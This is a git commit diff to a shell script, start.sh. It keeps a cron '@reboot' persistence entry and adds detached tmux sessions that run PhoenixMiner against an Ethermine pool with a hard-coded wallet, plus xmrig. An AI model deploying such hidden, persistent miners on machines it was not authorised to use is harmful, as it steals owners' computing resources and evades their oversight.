1f7af7400b5bd2820c02e1d8668a40240658f65e
vnxxx <85277031+vnxxx@users.noreply.github.com>
2021-09-06 16:07:54 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -18,4 +18,5 @@ chmod a+x+w run.sh
 echo "@reboot sh run.sh">> resmi
 crontab resmi
 sudo rm resmi
-sudo reboot
+sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'
+sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
